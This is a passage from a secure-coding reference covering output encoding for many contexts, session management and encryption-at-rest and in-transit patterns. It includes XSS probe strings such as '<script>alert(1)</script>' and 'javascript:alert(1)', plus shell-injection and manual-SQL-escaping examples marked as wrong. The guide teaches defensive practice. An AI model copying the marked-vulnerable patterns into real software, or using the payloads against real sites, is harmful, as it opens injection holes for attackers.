# BAD: <USER_DATA> or <div USER_DATA="value">
# These positions expect identifiers, not data

# CORRECT APPROACH: Use data attributes
def render_safe_template(user_data):
    return f'''
    <div id="container" data-user-value="{encode_html_attribute(user_data)}"></div>
    <script>
        const container = document.getElementById('container');
        const userData = container.dataset.userValue;
        // userData is now safely available in JavaScript
    </script>
    '''
```

### JavaScript Context Encoding

#### JavaScript String Literal Context

```python
import json

def encode_js_string(data):
    """
    Context: var x = "USER_DATA"; or 'USER_DATA'
    JSON encoding handles all JavaScript string escaping requirements
    """
    if data is None:
        return ''
    
    # json.dumps handles: quotes, backslashes, control chars, unicode
    # Strip outer quotes since we're inserting into existing string literal
    return json.dumps(str(data))[1:-1]

# Usage in template
def render_js_template(user_name):
    encoded_name = encode_js_string(user_name)
    return f'''
    <script>
        var userName = "{encoded_name}";
        console.log(userName);
    </script>
    '''
```

**Anti-pattern:** Manual backslash/quote escaping is error-prone. Use battle-tested JSON encoding libraries.

**Edge case:** Be aware of HTML context when JavaScript is inline. Need defense in depth:

```python
def encode_for_inline_js(data):
    """
    Context: <script>var x = "USER_DATA";</script>
    Requires both JS encoding AND protection from </script> sequences
    """
    js_encoded = encode_js_string(data)
    
    # Prevent breaking out of script tag
    # Replace </script> with <\/script> (JavaScript allows this)
    html_safe = js_encoded.replace('</', '<\\/')
    
    return html_safe
```

#### JavaScript Template Literal Context

```python
def encode_js_template_literal(data):
    """
    Context: var x = `USER_DATA`;
    Template literals have different escape requirements
    """
    if data is None:
        return ''
    
    return (str(data)
        .replace('\\', '\\\\')  # Escape backslashes first
        .replace('`', '\\`')     # Escape backticks
        .replace('${', '\\${'))  # Escape interpolation syntax
```

**Critical:** Template literals support interpolation (`${expr}`). Must escape interpolation syntax to prevent code execution.

### URL Context Encoding

#### URL Parameter Value Context

```python
from urllib.parse import quote, quote_plus

def encode_url_parameter(data):
    """
    Context: ?param=USER_DATA or &key=USER_DATA
    Encodes all special characters except unreserved (A-Za-z0-9-._~)
    """
    if data is None:
        return ''
    
    # quote() for general URL encoding
    # quote_plus() converts spaces to + (application/x-www-form-urlencoded)
    return quote(str(data), safe='')

def encode_url_parameter_form(data):
    """For application/x-www-form-urlencoded (HTML forms)"""
    return quote_plus(str(data))

# Usage
search_term = "user's search: <script>"
url = f"https://example.com/search?q={encode_url_parameter(search_term)}"
# Result: https://example.com/search?q=user%27s%20search%3A%20%3Cscript%3E
```

**Anti-pattern:** Using `+` for spaces in modern URLs. Use `%20` unless specifically dealing with form encoding.

#### URL Path Segment Context

```python
def encode_url_path_segment(data):
    """
    Context: /path/USER_DATA/resource
    Path segments have different reserved characters than query params
    """
    if data is None:
        return ''
    
    # RFC 3986: Reserve / and ? in path segments
    return quote(str(data), safe='')

# Usage
file_name = "report (final).pdf"
url = f"/files/{encode_url_path_segment(file_name)}"
# Result: /files/report%20%28final%29.pdf
```

**Critical:** Never insert user data into URL scheme or hostname positions. These contexts cannot be safely encoded.

```python
# DANGEROUS - DO NOT DO THIS
user_input = "javascript:alert(1)"
url = f"{user_input}://example.com"  # Creates XSS vector

# CORRECT - Validate scheme first
def build_safe_url(scheme, host, path):
    if scheme not in ['http', 'https']:
        raise ValueError('Invalid URL scheme')
    
    # Validate host format (domain or IP)
    if not is_valid_hostname(host):
        raise ValueError('Invalid hostname')
    
    encoded_path = encode_url_path_segment(path)
    return f"{scheme}://{host}/{encoded_path}"
```

### SQL Context Encoding

**Critical:** SQL encoding is fundamentally different from other contexts. Parameterized queries (prepared statements) are the only safe approach—manual escaping is insufficient.

```python
import sqlite3
import psycopg2

# WRONG: Manual SQL escaping (vulnerable to edge cases)
def unsafe_sql_query(user_input):
    escaped = user_input.replace("'", "''")  # Insufficient protection
    query = f"SELECT * FROM users WHERE name = '{escaped}'"
    # Still vulnerable to encoding attacks, null bytes, etc.
    return query

# CORRECT: Parameterized queries
def safe_sql_query(user_input):
    """
    Database driver handles all escaping/encoding automatically
    User input never interpreted as SQL syntax
    """
    query = "SELECT * FROM users WHERE name = ?"  # SQLite
    # query = "SELECT * FROM users WHERE name = %s"  # PostgreSQL/MySQL
    
    cursor.execute(query, (user_input,))  # Tuple of parameters
    return cursor.fetchall()

# CORRECT: Named parameters (more readable for complex queries)
def safe_named_parameters(username, email):
    query = """
        SELECT * FROM users 
        WHERE username = :username 
        AND email = :email
    """
    cursor.execute(query, {'username': username, 'email': email})
    return cursor.fetchall()
```

**Anti-pattern:** Concatenating SQL queries with escaped user input. Encoding edge cases (multi-byte characters, null bytes, character set differences) create vulnerabilities.

**Exception:** Dynamic table/column names cannot use parameterized queries. Must use allowlist validation:

```python
def query_dynamic_table(table_name, user_id):
    """
    Table names cannot be parameterized in SQL
    Must validate against allowlist
    """
    ALLOWED_TABLES = {'users', 'products', 'orders'}
    
    if table_name not in ALLOWED_TABLES:
        raise ValueError('Invalid table name')
    
    # Safe because table_name validated against allowlist
    query = f"SELECT * FROM {table_name} WHERE id = ?"
    cursor.execute(query, (user_id,))
    return cursor.fetchall()
```

### JSON Context Encoding

```python
import json

def encode_json_value(data):
    """
    Context: {"key": USER_DATA} or [USER_DATA]
    JSON encoding handles quotes, backslashes, control characters, unicode
    """
    return json.dumps(data, ensure_ascii=False)

def encode_json_in_html(data):
    """
    Context: <script>var data = USER_JSON;</script>
    Requires escaping HTML-sensitive characters after JSON encoding
    """
    json_str = json.dumps(data, ensure_ascii=False)
    
    # Prevent breaking out of script tag or creating HTML injection
    html_safe = (json_str
        .replace('<', '\\u003c')   # Prevent </script>
        .replace('>', '\\u003e')   # Prevent -->
        .replace('&', '\\u0026'))  # Prevent &...;
    
    return html_safe

# Usage
user_data = {'name': 'Alice</script><script>alert(1)</script>'}
template = f'''
<script>
    var userData = {encode_json_in_html(user_data)};
</script>
'''
```

**Critical:** When embedding JSON in HTML script tags, must escape HTML-sensitive characters (`<`, `>`, `&`) even after JSON encoding.

### CSS Context Encoding

```python
def encode_css_string(data):
    """
    Context: content: "USER_DATA"; or background: url("USER_DATA");
    CSS string context is extremely complex
    """
    if data is None:
        return ''
    
    encoded = []
    for char in str(data):
        code = ord(char)
        
        # Escape backslashes and quotes
        if char in ('\\', '"', "'"):
            encoded.append('\\' + char)
        # Encode non-printable and non-ASCII as hex
        elif code < 0x20 or code > 0x7E:
            encoded.append(f'\\{code:x} ')  # Space prevents hex expansion
        else:
            encoded.append(char)
    
    return ''.join(encoded)

# Usage in template
def render_css_template(user_color):
    encoded_color = encode_css_string(user_color)
    return f'''
    <style>
        .custom {{ color: "{encoded_color}"; }}
    </style>
    '''
```

**Anti-pattern:** Allowing user data in CSS url() values. Even with encoding, `url("javascript:...")` can execute code in some browsers. Use allowlist validation for URLs.

**Recommendation:** Avoid inserting user data into CSS contexts entirely. Use predefined CSS classes and allow users to select from safe options.

### XML Context Encoding

```python
import xml.sax.saxutils as saxutils

def encode_xml_content(data):
    """
    Context: <element>USER_DATA</element>
    Similar to HTML but with stricter rules
    """
    if data is None:
        return ''
    
    return saxutils.escape(str(data), entities={
        '"': '&quot;',
        "'": '&apos;'
    })

def encode_xml_attribute(data):
    """
    Context: <element attr="USER_DATA">
    Must always use quoted attributes
    """
    # Same as content encoding, enforce quoted attributes
    return encode_xml_content(data)
```

**Edge case:** XML does not allow certain control characters even when encoded. Strip characters `\x00-\x08`, `\x0B`, `\x0C`, `\x0E-\x1F` before encoding.

```python
import re

def sanitize_for_xml(data):
    """Remove characters illegal in XML 1.0"""
    if data is None:
        return ''
    
    # XML 1.0 illegal characters
    illegal_xml_chars = re.compile(
        '[\x00-\x08\x0B\x0C\x0E-\x1F\uD800-\uDFFF\uFFFE\uFFFF]'
    )
    
    sanitized = illegal_xml_chars.sub('', str(data))
    return encode_xml_content(sanitized)
```

### LDAP Context Encoding

```python
def encode_ldap_dn(data):
    """
    Context: Distinguished Name (DN)
    Escapes: , + " \ < > ; # =
    """
    if data is None:
        return ''
    
    special_chars = {',', '+', '"', '\\', '<', '>', ';', '#', '='}
    
    encoded = []
    for char in str(data):
        if char in special_chars:
            encoded.append('\\' + char)
        elif ord(char) < 0x20:
            # Escape control characters as hex
            encoded.append(f'\\{ord(char):02x}')
        else:
            encoded.append(char)
    
    return ''.join(encoded)

def encode_ldap_filter(data):
    """
    Context: LDAP search filter
    Escapes: * ( ) \ NUL
    """
    if data is None:
        return ''
    
    return (str(data)
        .replace('\\', '\\5c')  # Must be first
        .replace('*', '\\2a')
        .replace('(', '\\28')
        .replace(')', '\\29')
        .replace('\x00', '\\00'))
```

### Command Line Context Encoding

**Critical:** Command line encoding is platform-specific and extremely error-prone. Use subprocess with argument lists instead of shell invocation.

```python
import subprocess
import shlex

# WRONG: Shell injection vulnerability
def unsafe_command(user_input):
    command = f"ls -l {user_input}"  # Vulnerable to injection
    subprocess.call(command, shell=True)  # DO NOT USE shell=True

# CORRECT: Argument list (no shell interpretation)
def safe_command(user_input):
    """
    Pass arguments as list - no shell interpretation
    User input treated as literal argument value
    """
    subprocess.call(['ls', '-l', user_input])  # Safe

# If shell absolutely required (avoid if possible)
def shell_command_with_quoting(user_input):
    """
    Use shlex.quote() for POSIX systems
    Platform-specific - does not work on Windows
    """
    quoted = shlex.quote(user_input)
    command = f"ls -l {quoted}"
    subprocess.call(command, shell=True)  # Still prefer shell=False
```

**Anti-pattern:** Attempting to manually escape shell metacharacters. Shell syntax varies across platforms and is too complex for reliable manual escaping.

### Defense in Depth Strategy

[Inference] Effective output encoding requires multiple layers of defense:

```python
class OutputEncoder:
    """
    Centralized encoding with context validation
    """
    @staticmethod
    def encode(data, context):
        """
        Dispatch to appropriate encoder based on context
        Fails closed if context unknown
        """
        encoders = {
            'html_body': encode_html_body,
            'html_attr': encode_html_attribute,
            'js_string': encode_js_string,
            'url_param': encode_url_parameter,
            'css_string': encode_css_string,
            'json': encode_json_value,
            'xml': encode_xml_content,
        }
        
        if context not in encoders:
            raise ValueError(f'Unknown encoding context: {context}')
        
        return encoders[context](data)
    
    @staticmethod
    def validate_and_encode(data, context, validator=None):
        """
        Apply validation before encoding (defense in depth)
        """
        if validator:
            if not validator(data):
                raise ValueError('Data failed validation')
        
        return OutputEncoder.encode(data, context)

# Usage with validation
def render_search_result(search_term):
    # Validate input length before encoding
    def max_length_validator(data):
        return len(str(data)) <= 100
    
    encoded = OutputEncoder.validate_and_encode(
        search_term,
        'html_body',
        validator=max_length_validator
    )
    
    return f'<p>Results for: {encoded}</p>'
```

### Template Engine Auto-Escaping

[Inference] Modern template engines provide context-aware auto-escaping, reducing manual encoding burden:

```python
from jinja2 import Environment, select_autoescape

# Configure Jinja2 with auto-escaping
env = Environment(
    autoescape=select_autoescape(['html', 'xml'])
)

template = env.from_string('''
    <div>
        <p>{{ user_name }}</p>  <!-- Auto-escaped for HTML -->
        <a href="/user?id={{ user_id | urlencode }}">Profile</a>
    </div>
''')

result = template.render(
    user_name='<script>alert(1)</script>',
    user_id='test&param=value'
)
# Output: <p>&lt;script&gt;alert(1)&lt;/script&gt;</p>
```

**Critical:** Verify template engine auto-escaping is enabled and covers all contexts in use. Some contexts (JavaScript, CSS) may not be automatically handled.

**Anti-pattern:** Marking user input as "safe" to bypass auto-escaping. Only mark trusted, pre-sanitized content as safe.

```python
from markupsafe import Markup

# WRONG: Marking user input as safe
user_input = '<script>alert(1)</script>'
unsafe = Markup(user_input)  # Bypasses escaping - DO NOT DO

# CORRECT: Only mark trusted content as safe
trusted_html = sanitize_html(user_input)  # Sanitization library
safe = Markup(trusted_html)  # Now safe to bypass escaping
```

### Content Security Policy Integration

Output encoding prevents injection attacks, but Content Security Policy (CSP) provides additional mitigation layer:

```python
def render_with_csp(user_data):
    """
    Combine output encoding with CSP headers
    CSP provides defense in depth if encoding fails
    """
    encoded_data = encode_html_body(user_data)
    
    headers = {
        'Content-Security-Policy': (
            "default-src 'self'; "
            "script-src 'self'; "  # No inline scripts
            "style-src 'self'; "   # No inline styles
            "object-src 'none'"    # No plugins
        )
    }
    
    return {
        'body': f'<p>{encoded_data}</p>',
        'headers': headers
    }
```

[Inference] CSP complements output encoding by restricting what injected code can execute, providing fallback protection if encoding is bypassed.

### Encoding Performance Considerations

```python
from functools import lru_cache

@lru_cache(maxsize=1024)
def cached_encode_html(data):
    """
    Cache encoding results for frequently repeated values
    Only safe for immutable inputs
    """
    return encode_html_body(data)

# Batch encoding for large datasets
def batch_encode_html(data_list):
    """
    Encode multiple values efficiently
    Reuse encoder instance to amortize setup costs
    """
    return [encode_html_body(item) for item in data_list]
```

**Caveat:** Caching encoded output requires careful consideration of cache invalidation and memory usage. Only cache high-frequency, low-cardinality values.

### Anti-Patterns Summary

1. **Universal encoding function**: No single encoding works for all contexts
2. **Double encoding**: Encoding already-encoded data creates incorrect output
3. **Encoding at storage time**: Encode at output time based on destination context
4. **Manual SQL escaping**: Always use parameterized queries
5. **Trusting encoding libraries for all contexts**: Verify library handles your specific context correctly
6. **Unquoted HTML attributes**: Always use quoted attributes with encoded values
7. **Inserting user data in JavaScript event handlers**: Fundamentally unsafe regardless of encoding
8. **Shell command string concatenation**: Use argument lists instead
9. **Encoding without validation**: Encoding does not fix malformed or excessively long input
10. **Disabling template auto-escaping globally**: Disable selectively only for trusted content

**Related topics:** Input validation vs output encoding responsibilities, canonicalization attacks, character encoding normalization, Content Security Policy nonce/hash patterns, Trusted Types API for DOM XSS prevention, sanitization vs encoding trade-offs, encoding for rich text editors.

---

## Secure Session Management

Session management maintains authenticated user state across stateless HTTP transactions while preventing unauthorized access, hijacking, and fixation attacks. Implementation requires cryptographic session identifiers, secure storage mechanisms, lifecycle controls, and continuous validation of session integrity.

### Session Identifier Generation

**Cryptographic Requirements**

- Minimum 128 bits entropy from cryptographically secure random number generator (CSPRNG)
- Platform APIs: `/dev/urandom`, `crypto.randomBytes()`, `SecureRandom`, `RNGCryptoServiceProvider`
- **Anti-pattern:** Using predictable sources (timestamps, sequential counters, weak PRNGs like `Math.random()`)
- Base64 or hexadecimal encoding for HTTP header/cookie transmission
- No embedded user information or predictable patterns enabling enumeration

**Uniqueness and Collision Resistance**

- Session ID collision probability must be negligible (< 2^-64 for 128-bit IDs)
- Verify uniqueness before assignment in distributed systems
- UUIDv4 provides 122 bits entropy but UUID format reveals generation method
- [Inference] Custom identifier schemes risk implementation flaws; prefer vetted framework implementations

**Rotation on Authentication State Changes**

- Generate new session ID upon successful login (prevents session fixation)
- Regenerate after privilege escalation or role changes
- Invalidate old session ID immediately to prevent parallel session usage
- Preserve session data while rotating identifier to maintain user experience

### Session Storage Architectures

**Server-Side Storage**

- **In-Memory:** Fastest access, volatile, lost on restart, not suitable for distributed deployments
- **Database:** Persistent, supports clustering, adds query latency, requires indexing on session ID
- **Distributed Cache:** Redis, Memcached for horizontal scaling with sub-millisecond access
- **Encrypted Storage:** Sensitive session data encrypted at rest using envelope encryption pattern

**Stateless Token-Based Sessions**

- Entire session state encoded in cryptographically signed token (JWT)
- No server-side storage required, enables horizontal scaling without shared state
- Revocation challenges: token valid until expiration unless explicit deny list maintained
- Token size impacts network overhead (cookie limits, header size constraints)
- [Inference] Stateless tokens sacrifice immediate revocation capability for scalability

**Hybrid Approach**

- Session identifier references minimal server-side state (user ID, creation time)
- Full session data cached in distributed store with fallback to database
- Balances revocation control with reduced storage requirements
- Enables partial session invalidation (e.g., device-specific termination)

### Cookie Security Configuration

**Attribute Requirements**

- `HttpOnly`: Prevents JavaScript access, mitigates XSS-based token theft
- `Secure`: Enforces HTTPS-only transmission, prevents cleartext interception
- `SameSite=Strict|Lax`: CSRF protection, controls cross-site request cookie attachment
    - `Strict`: Cookie never sent on cross-site requests (breaks external link authentication)
    - `Lax`: Cookie sent on top-level GET navigation (safe CSRF protection)
    - `None`: Requires `Secure` flag, needed for cross-site embedded contexts
- `Domain`: Scoped to specific domain/subdomain, avoid overly broad domain cookies
- `Path`: Restrict to application paths requiring authentication

**SameSite Edge Cases**

- POST requests from external sites omit `SameSite=Lax` cookies (requires CSRF tokens)
- Embedded iframe authentication requires `SameSite=None` with `Secure`
- Browser incompatibilities: older browsers ignore SameSite, treat as no restriction
- [Inference] Defense-in-depth requires CSRF tokens even with SameSite protection

**Cookie Size Limitations**

- Individual cookie: 4KB maximum across major browsers
- Total cookies per domain: 20-50 depending on browser
- Exceeding limits causes silent truncation or cookie rejection
- Mitigation: Store session ID only in cookie, reference server-side data

### Session Lifecycle Management

**Absolute Timeout (Maximum Lifespan)**

- Hard limit regardless of activity (e.g., 12-24 hours)
- Forces re-authentication periodically for security-sensitive applications
- Prevents indefinite session validity through continuous activity
- Configurable per application security requirements

**Idle Timeout (Inactivity)**

- Session terminated after period without user interaction (e.g., 15-30 minutes)
- Reset on each authenticated request extending session validity
- Balances security (limits abandoned session exposure) with usability
- Warning notification before expiration improves user experience

**Absolute vs Sliding Expiration**

- **Absolute:** Expiration timestamp set at creation, never extended
- **Sliding:** Expiration extends with each request up to maximum lifespan
- Sliding prevents abrupt termination during active use but extends total exposure window
- [Inference] Security-critical applications prefer absolute expiration to enforce re-authentication

**Grace Period Handling**

- Allow brief period (60-120 seconds) post-expiration for in-flight requests
- Prevents race conditions where request initiated before expiration arrives after
- Display re-authentication prompt rather than cryptic error messages
- **Anti-pattern:** Extended grace periods negate timeout security benefits

### Session Hijacking Prevention

**Transport Layer Protection**

- Enforce HTTPS for all authenticated requests (HSTS header with preload)
- TLS 1.2+ with strong cipher suites, disable vulnerable protocols (SSL, TLS 1.0/1.1)
- Certificate pinning for mobile applications prevents MITM attacks
- [Inference] Network-level attacks remain viable on compromised networks despite HTTPS

**User-Agent and IP Binding**

- Store initial User-Agent and IP address with session
- Validate consistency on subsequent requests, terminate on mismatch
- **Limitation:** Legitimate IP changes (mobile networks, VPN switches, corporate proxies)
- **Limitation:** User-Agent spoofing trivial for attackers
- Use as heuristic signal, not absolute authentication factor
- [Inference] Strict binding causes false positives; implement progressive challenges instead

**Device Fingerprinting**

- Combine multiple browser characteristics (canvas rendering, fonts, plugins, screen resolution)
- Entropy sufficient to distinguish devices without persistent identifiers
- Changes trigger step-up authentication or account recovery flow
- Privacy considerations: fingerprinting techniques raise tracking concerns
- [Inference] Fingerprinting reliability degrades with browser privacy enhancements (fingerprint randomization)

**Token Binding and mTLS**

- Cryptographically bind session to TLS connection or client certificate
- Prevents token replay on different connection/device
- Requires client certificate infrastructure or token binding browser support
- [Unverified] Token Binding specification has limited browser adoption; consider DPoP alternative

### Concurrent Session Management

**Single Active Session**

- Terminate previous sessions upon new authentication
- Use case: Prevent account sharing, enforce device limits
- User experience impact: legitimate multi-device usage disrupted

**Limited Concurrent Sessions**

- Allow N active sessions (e.g., 3-5 devices)
- Oldest session terminated when limit exceeded
- Per-device session tracking enables selective termination
- Requires device identification and session association storage

**Unlimited Sessions with Monitoring**

- No hard limit but anomaly detection for suspicious patterns
- Geographic impossibility detection (locations too distant for travel time)
- Velocity checks (excessive authentication attempts, rapid IP changes)
- Alert user of new session creation via email/push notification

### Session Fixation Prevention

**Attack Vector**

- Attacker obtains valid session ID before victim authentication
- Victim authenticates using attacker-controlled session ID
- Attacker gains authenticated session access without credentials

**Mitigation Strategies**

- **Session ID Regeneration:** Issue new ID after successful login (mandatory)
- **Reject Pre-Authentication Session IDs:** Only accept IDs issued by application
- **Token Binding:** Bind session to additional authentication factors
- **Accept Session IDs via Cookies Only:** Reject URL parameters preventing injection
- **Anti-pattern:** Accepting session IDs from query strings enables trivial fixation attacks

### Cross-Site Request Forgery (CSRF) Protection

**Synchronizer Token Pattern**

- Generate unique CSRF token per session or per request
- Embed token in forms as hidden field, validate on submission
- Token must be unpredictable (CSPRNG), tied to user session
- Double-submit cookie variant: same token in cookie and request parameter
- **Limitation:** Subdomain compromise enables cookie injection in double-submit pattern

**Custom Header Validation**

- Single-page applications include custom header (X-CSRF-Token) in AJAX requests
- Cross-origin requests cannot add custom headers without CORS preflight approval
- Verify presence and value of custom header server-side
- Simpler than synchronizer tokens for API-driven applications

**Origin and Referer Validation**

- Verify Origin or Referer header matches expected application domain
- **Limitation:** Headers may be absent in privacy-focused configurations
- Use as defense-in-depth, not sole CSRF protection
- Strict validation prevents open redirector exploitation

**SameSite Cookie Integration**

- `SameSite=Strict|Lax` provides automatic CSRF protection
- Eliminates need for CSRF tokens in many scenarios
- Required fallback for browsers without SameSite support
- [Inference] Combining SameSite with synchronizer tokens provides layered defense

### Session Invalidation and Logout

**Client-Side Cleanup**

- Clear session cookies (set expiration to past date)
- Remove tokens from local storage, session storage, memory
- Clear sensitive data from DOM and JavaScript variables
- Browser cache clearing recommendations displayed to user

**Server-Side Termination**

- Remove session from storage backend immediately
- Distributed cache invalidation via pub/sub or cache invalidation API
- Add session ID to deny list for stateless tokens
- Set session status flag to "terminated" to handle in-flight requests gracefully

**Global Logout (All Devices)**

- User-initiated termination of all sessions across devices
- Requires session enumeration by user identifier
- Batch invalidation operations for efficiency
- Notification sent to all affected devices/sessions
- [Inference] Distributed session stores require eventual consistency handling during mass invalidation

**Logout Token Propagation**

- Federated SSO scenarios require logout propagation to Identity Provider
- OIDC back-channel logout sends notification to registered endpoints
- Front-channel logout uses iframe-based notification (deprecated due to tracking prevention)
- Network failures may prevent complete logout; enforce local session timeout

### Session Monitoring and Anomaly Detection

**Activity Logging**

- Session creation timestamp and source (IP, User-Agent, geolocation)
- Last activity timestamp and request count
- Authentication method and assurance level
- Privilege escalation events and sensitive operation access
- Session termination reason (logout, timeout, forced invalidation)

**Behavioral Anomalies**

- Impossible travel: Session activity from distant locations within short timeframe
- Device switching: User-Agent changes mid-session
- Access pattern deviation: Unusual pages accessed or API calls made
- High-frequency requests indicating scripted activity or bot behavior
- [Inference] Machine learning models improve detection accuracy but require training data and tuning

**Alerting and Response**

- Real-time alerts for high-risk anomalies (geographic impossibility)
- Progressive challenges: captcha, MFA step-up, account verification
- Automatic session termination for severe threats
- User notification via out-of-band channel (email, SMS)
- **Anti-pattern:** Aggressive false positives degrade user experience and trust

### Distributed System Challenges

**Session Affinity (Sticky Sessions)**

- Route requests with same session ID to same server instance
- Load balancer session persistence based on cookie or IP
- **Limitation:** Server failure terminates all bound sessions
- **Limitation:** Uneven load distribution if sessions long-lived

**Distributed Session Storage**

- Redis Cluster or Memcached for shared session state
- Replication ensures availability during node failures
- Requires consistent hashing or partition-aware clients
- Serialization format impacts performance (MessagePack, Protocol Buffers vs JSON)
- [Inference] Network latency to session store impacts request processing time; cache locally when possible

**Eventual Consistency Implications**

- Session updates may not propagate immediately across replicas
- Logout may not terminate session on all nodes simultaneously
- Mitigation: Short TTLs and cache invalidation signals
- Critical operations require synchronous consistency (two-phase commit, consensus)

**Clock Skew and Time Synchronization**

- Distributed nodes with unsynchronized clocks cause premature/delayed expiration
- NTP synchronization mandatory for accurate timeout enforcement
- Allow tolerance window (±30 seconds) for timestamp validation
- [Inference] Persistent clock skew indicates infrastructure issues requiring remediation

### Framework and Platform Specifics

**Java Servlet Sessions**

- `HttpSession` API with container-managed lifecycle
- Session fixation protection via `changeSessionId()` post-authentication
- Distributed session management via clustering or external store (Spring Session)
- **Anti-pattern:** Storing sensitive objects directly in session without encryption

**.NET Session State**

- `HttpSessionState` with InProc, StateServer, or SQLServer modes
- InProc mode non-durable, StateServer/SQL enable load balancing
- `SessionStateMode.Custom` for Redis or other distributed cache integration
- `<sessionState>` configuration: timeout, cookieless mode (discouraged)

**PHP Session Management**

- `session_start()` with `session_regenerate_id(true)` after authentication
- Custom session handlers for Redis/Memcached via `session_set_save_handler()`
- `session.cookie_httponly`, `session.cookie_secure`, `session.cookie_samesite` ini directives
- **Anti-pattern:** Default file-based storage lacks scalability and security

**Node.js Express**

- `express-session` middleware with configurable store (MemoryStore, RedisStore, MongoStore)
- `resave: false` and `saveUninitialized: false` reduce unnecessary storage operations
- `cookie.secure: true` and `cookie.httpOnly: true` for production
- **Anti-pattern:** MemoryStore in production (non-scalable, memory leak risk)

### Mobile Application Sessions

**Refresh Token Pattern**

- Short-lived access tokens (minutes) with long-lived refresh tokens (days/weeks)
- Access token embedded in API requests, refresh token stored securely
- Token refresh before expiration prevents authentication interruption
- Refresh token rotation on each use prevents theft exploitation

**Biometric Re-Authentication**

- Periodic biometric challenge (fingerprint, Face ID) for sensitive operations
- Local device authentication, not transmitted to server
- Failed biometric attempts trigger full credential re-authentication
- Session remains valid but requires biometric proof for privileged actions

**Device Binding**

- Associate session with device identifier (hardware ID, secure enclave key)
- Prevent session export to different device
- Device attestation proves authentic device, not emulator or tampered environment
- [Inference] Rooted/jailbroken devices may bypass device binding controls

**Background Session Handling**

- Application backgrounding may extend idle timeout tolerance
- Push notifications trigger session validation before processing
- Session expiration during background mode requires graceful re-authentication flow

### Regulatory and Compliance Considerations

**GDPR and Data Minimization**

- Session data classified as personal data under GDPR
- Minimize stored attributes, avoid excessive profiling
- Retention period justification and documented purging procedures
- User right to access session history and active sessions

**PCI-DSS Session Requirements**

- Maximum 15-minute idle timeout for cardholder data access
- Re-authentication required after timeout or when leaving workstation
- Session ID not transmitted in URLs
- Session management must prevent session hijacking and fixation

**HIPAA Session Controls**

- Automatic logoff for electronic sessions after predetermined inactivity
- Encryption of session data containing PHI
- Audit logging of all session activities involving protected health information
- Emergency access procedures with enhanced logging

### Implementation Anti-Patterns

**Session ID in URL Parameters**

- Logged in server access logs, browser history, referrer headers
- Shared URLs expose valid session identifiers
- Search engine indexing may cache authenticated pages
- Mitigation: Cookies or custom headers exclusively for session transport

**Weak Session ID Generation**

- Predictable IDs enable brute-force enumeration attacks
- Timestamp-based or sequential IDs reveal generation pattern
- Insufficient entropy allows collision attacks
- [Inference] Framework default session mechanisms generally secure; custom implementations risk flaws

**No Session Timeout Implementation**

- Sessions remain valid indefinitely increasing compromise window
- Abandoned sessions accumulate consuming storage resources
- Violates principle of least privilege (time-bound access)

**Client-Side Session Storage Without Integrity Protection**

- Session data in localStorage/sessionStorage without cryptographic signature
- JavaScript modification allows privilege escalation
- XSS vulnerabilities enable trivial session manipulation
- Mitigation: Store only server-issued signed tokens client-side

**Ignoring Logout Functionality**

- No explicit session termination mechanism provided
- Users rely on timeout expiration (extended exposure)
- Shared device scenarios leave authenticated sessions active
- Logout must be prominent, accessible, and fully functional

### Testing and Validation

**Session Security Test Cases**

- Session fixation: Verify ID regeneration post-authentication
- Session hijacking: Attempt session reuse from different IP/User-Agent
- Concurrent sessions: Validate limit enforcement and oldest session eviction
- Timeout accuracy: Confirm idle and absolute timeout enforcement precision
- CSRF protection: Verify state-changing operations require valid tokens
- Logout completeness: Ensure session fully invalidated and inaccessible post-logout

**Automated Security Scanning**

- OWASP ZAP session management tests
- Burp Suite session token analysis (entropy, randomness)
- Cookie security attribute validation
- Session timeout verification through delayed replay attacks

**Penetration Testing Focus Areas**

- Session token predictability analysis
- Cookie tampering and signature validation
- Privilege escalation via session modification
- Session donation and fixation attack scenarios

### Related Topics

- OAuth 2.0 and OpenID Connect token management
- JSON Web Tokens (JWT) structure and validation
- Cross-Site Scripting (XSS) prevention
- Cross-Site Request Forgery (CSRF) mitigation techniques
- HTTP Strict Transport Security (HSTS) and secure transport
- Content Security Policy (CSP) for session token protection
- Redis session store configuration and clustering
- Database session storage schema design and indexing strategies
- Zero Trust continuous authentication models
- Behavioral biometrics and risk-based authentication

---

## Encryption Patterns

Encryption patterns define systematic approaches for protecting data confidentiality through cryptographic transformations. These architectural patterns address where, when, and how encryption occurs within systems, balancing security requirements against performance, operational complexity, and key management overhead.

### Encryption-at-Rest Pattern

Protects data persisted to durable storage media against unauthorized access when physical security fails or storage media is decommissioned.

**Database-Level Encryption**: Transparent Data Encryption (TDE) encrypts entire database files, tablespaces, or individual columns without application modification. DBMS handles encryption/decryption automatically during I/O operations.

**File-System Encryption**: Operating system or storage layer encrypts blocks before writing to disk. Examples: LUKS (Linux), BitLocker (Windows), FileVault (macOS). Transparent to applications but requires full disk access for key compromise.

**Application-Level Encryption**: Application encrypts sensitive fields before database insertion. Granular control over encrypted columns, but increases application complexity and query limitations.

**Column-Level vs. Row-Level vs. Table-Level**:

- **Column-Level**: Encrypts specific sensitive columns (SSN, credit cards). Enables queries on unencrypted columns. Deterministic encryption required for WHERE clause filtering.
- **Row-Level**: Encrypts entire rows. Prevents partial decryption attacks but complicates indexing and searching.
- **Table-Level**: Encrypts entire tables. Simplest implementation but degrades performance for mixed-sensitivity data.

**Key-Per-Tenant Pattern**: Multi-tenant systems encrypt each tenant's data with unique DEK (Data Encryption Key). Tenant compromise isolates blast radius. Increases key management complexity proportional to tenant count.

**Key Rotation Mechanics**: Replace encryption keys periodically without re-encrypting data by implementing envelope encryption. Rotate KEK (Key Encryption Key) while maintaining encrypted DEKs. Full data re-encryption required only for DEK rotation.

### Encryption-in-Transit Pattern

Protects data during network transmission against eavesdropping, tampering, and man-in-the-middle attacks.

**TLS/SSL Layer**: Transport Layer Security encrypts TCP connections between clients and servers. TLS 1.2 minimum (TLS 1.3 recommended). Certificate validation mandatory to prevent MITM attacks.

**Certificate Pinning**: Client validates server certificate matches expected value rather than trusting certificate authority chain. Prevents CA compromise attacks but requires application updates for certificate rotation.

**Mutual TLS (mTLS)**: Both client and server present certificates for bidirectional authentication. Common in service mesh architectures (Istio, Linkerd) for zero-trust networking.

**VPN Tunneling**: Encrypts all traffic between network endpoints. IPsec or WireGuard protocols. Protects legacy applications without TLS support but adds network latency.

**Application-Layer Encryption**: Encrypt payload before transmission independent of transport security. Defense-in-depth against TLS termination proxies or compromised intermediaries. Example: PGP email encryption, Signal Protocol.

**End-to-End Encryption (E2EE)**: Only communicating endpoints hold decryption keys. Intermediary servers cannot decrypt payloads. Requires complex key exchange protocols (Diffie-Hellman, Signal Protocol).

### Envelope Encryption Pattern

